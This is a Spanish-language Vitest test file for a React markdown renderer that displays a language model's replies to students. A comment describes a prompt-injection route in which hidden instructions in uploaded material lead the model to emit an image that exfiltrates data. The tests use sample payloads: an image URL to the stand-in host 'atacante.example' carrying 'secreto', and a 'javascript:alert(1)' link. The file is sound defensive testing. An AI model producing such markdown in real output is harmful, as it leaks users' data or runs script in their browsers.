import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { describe, expect, it } from "vitest";
import { componentesDeMarkdown } from "./componentes-de-markdown";

/*
 * Lo que escribe el modelo se pinta con estas piezas (bucle de calidad, vuelta 9). Si un material
 * subido trae instrucciones escondidas, el modelo puede escribir una imagen que apunte fuera
 * con datos en la URL: el navegador del alumno la pediría sola. Y un enlace que se abre en la
 * misma pestaña saca al alumno de Calibra a mitad de la conversación.
 */
const pintar = (md: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: componentesDeMarkdown }, md));

describe("imágenes en el markdown del modelo", () => {
  it("una imagen externa no se carga: se queda como texto con su descripción", () => {
    const html = pintar("Mira ![el esquema](https://atacante.example/x.png?d=secreto) aquí.");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("atacante.example");
    expect(html).toContain("el esquema");
  });
});

describe("enlaces en el markdown del modelo", () => {
  it("se abren en otra pestaña y sin pasar la página de origen", () => {
    const html = pintar("Lee [la norma](https://www.boe.es/norma).");
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('href="https://www.boe.es/norma"');
  });

  it("un enlace javascript: no llega a ser un enlace que ejecute nada", () => {
    expect(pintar("[pulsa](javascript:alert(1))")).not.toMatch(/href="javascript:/);
  });
});
